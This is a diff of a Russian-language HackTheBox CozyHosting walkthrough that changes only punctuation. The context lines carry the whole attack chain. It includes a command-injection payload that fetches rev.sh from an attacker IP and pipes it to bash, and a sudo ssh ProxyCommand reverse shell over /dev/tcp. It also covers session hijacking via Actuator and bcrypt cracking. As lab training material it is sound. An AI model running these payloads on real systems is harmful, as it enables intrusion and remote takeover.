@@ -1,4 +1,4 @@
-COZYHOSTING (HTB) — ATTACK CHAIN
+﻿COZYHOSTING (HTB) - ATTACK CHAIN
 
 Reconnaissance
 ├── nmap -p- --min-rate=5000 -T4 → 22 (SSH), 80 (nginx "Cozy Hosting - Home")
@@ -49,20 +49,20 @@ nmap -sC -sV -p 22,80 cozyhosting.htb
 ```
 
 **Результат:**
-- `22/tcp` — SSH (OpenSSH 8.9p1 Ubuntu)
-- `80/tcp` — HTTP (nginx 1.18.0, "Cozy Hosting - Home")
+- `22/tcp` - SSH (OpenSSH 8.9p1 Ubuntu)
+- `80/tcp` - HTTP (nginx 1.18.0, "Cozy Hosting - Home")
 
 ```bash
 echo "10.129.229.88    cozyhosting.htb" | sudo tee -a /etc/hosts
 ```
 
-## 2. Веб-разведка — определяем стек
+## 2. Веб-разведка - определяем стек
 
 ```bash
 gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 ```
 
-**Находки:** `/login` (200), `/admin` (401 — требует авторизацию), `/logout` (204), `/error` (500).
+**Находки:** `/login` (200), `/admin` (401 - требует авторизацию), `/logout` (204), `/error` (500).
 
 Паттерн `/login` + `/logout` + `/error` указывает на **Spring Boot** (Java-фреймворк).
 
@@ -97,9 +97,9 @@ curl -s http://cozyhosting.htb/actuator/sessions
 
 ID активной сессии администратора `kanderson` получен напрямую через незащищённый Actuator-эндпоинт.
 
-**Угон сессии:** DevTools → Application → Cookies → подменяем `JSESSIONID` на полученное значение. Обновляем `/admin` — доступ получен.
+**Угон сессии:** DevTools → Application → Cookies → подменяем `JSESSIONID` на полученное значение. Обновляем `/admin` - доступ получен.
 
-## 5. Анализ /actuator/mappings — находим кастомный эндпоинт
+## 5. Анализ /actuator/mappings - находим кастомный эндпоинт
 
 ```bash
 curl -s http://cozyhosting.htb/actuator/mappings | jq
@@ -114,9 +114,9 @@ POST /executessh
 
 Эндпоинт принимает `host` и `username`, выполняет SSH-команду на бэкенде. Форма на `/admin` фильтрует пробелы в username (`Username can't contain whitespaces!`).
 
-## 6. Command Injection через /executessh — обход фильтра
+## 6. Command Injection через /executessh - обход фильтра
 
-Обходим фильтрацию пробелов через `${IFS}` (Internal Field Separator — bash использует его как разделитель слов, визуально не являясь пробелом).
+Обходим фильтрацию пробелов через `${IFS}` (Internal Field Separator - bash использует его как разделитель слов, визуально не являясь пробелом).
 
 **Готовим reverse shell на Kali:**
 ```bash
@@ -134,7 +134,7 @@ nc -lvnp 4444
 test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
 ```
 
-Через несколько секунд — shell от имени `app`.
+Через несколько секунд - shell от имени `app`.
 
 ## 7. Стабилизация shell
 
@@ -145,7 +145,7 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-## 8. Разведка на целевой машине — распаковка JAR
+## 8. Разведка на целевой машине - распаковка JAR
 
 ```bash
 whoami
@@ -194,7 +194,7 @@ hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
 
 **Результат:** `manchesterunited`
 
-## 11. Password reuse — SSH как josh, user flag
+## 11. Password reuse - SSH как josh, user flag
 
 В `/etc/passwd` находим пользователя `josh`:
 ```
@@ -221,9 +221,9 @@ User josh may run the following commands on localhost:
     (root) /usr/bin/ssh *
 ```
 
-`josh` может запускать `ssh` от root с любыми аргументами — классический GTFOBins-вектор через `ProxyCommand`.
+`josh` может запускать `ssh` от root с любыми аргументами - классический GTFOBins-вектор через `ProxyCommand`.
 
-## 13. Эксплуатация — ProxyCommand
+## 13. Эксплуатация - ProxyCommand
 
 ```bash
 nc -lvnp 5555
@@ -234,7 +234,7 @@ nc -lvnp 5555
 sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/10.10.14.177/5555 0>&1"' x
 ```
 
-`ssh` при указании `ProxyCommand` выполняет заданную команду в shell **до** попытки реального SSH-соединения — раз сам `ssh` запущен через sudo от root, команда внутри `ProxyCommand` тоже выполняется с правами root.
+`ssh` при указании `ProxyCommand` выполняет заданную команду в shell **до** попытки реального SSH-соединения - раз сам `ssh` запущен через sudo от root, команда внутри `ProxyCommand` тоже выполняется с правами root.
 
 ## 14. Root
 
@@ -251,9 +251,9 @@ cat root.txt
 
 # Ключевые уроки машины
 
-1. **Spring Boot Actuator — недооценённый источник утечек.** `/actuator/sessions` отдаёт ID активных сессий без авторизации, что позволяет угнать сессию администратора простой подменой cookie.
-2. **Command Injection через `${IFS}`** — классический обход фильтрации пробелов в параметрах, передаваемых в shell-команду.
-3. **Распаковка JAR-файлов** — `application.properties` внутри Spring Boot JAR часто содержит креды БД в открытом виде.
-4. **bcrypt-хеши в PostgreSQL** — даже захешированные пароли (`$2a$10$...`) уязвимы к брутфорсу через Hashcat (mode 3200), если пароль слабый.
-5. **Password reuse между приложением и SSH** — пароль администратора веб-панели подошёл к системному SSH-аккаунту.
-6. **`sudo ssh` с `ProxyCommand`** — классический GTFOBins-вектор: разрешение запускать `ssh` от root с произвольными аргументами эквивалентно полному root shell.
+1. **Spring Boot Actuator - недооценённый источник утечек.** `/actuator/sessions` отдаёт ID активных сессий без авторизации, что позволяет угнать сессию администратора простой подменой cookie.
+2. **Command Injection через `${IFS}`** - классический обход фильтрации пробелов в параметрах, передаваемых в shell-команду.
+3. **Распаковка JAR-файлов** - `application.properties` внутри Spring Boot JAR часто содержит креды БД в открытом виде.
+4. **bcrypt-хеши в PostgreSQL** - даже захешированные пароли (`$2a$10$...`) уязвимы к брутфорсу через Hashcat (mode 3200), если пароль слабый.
+5. **Password reuse между приложением и SSH** - пароль администратора веб-панели подошёл к системному SSH-аккаунту.
+6. **`sudo ssh` с `ProxyCommand`** - классический GTFOBins-вектор: разрешение запускать `ssh` от root с произвольными аргументами эквивалентно полному root shell.
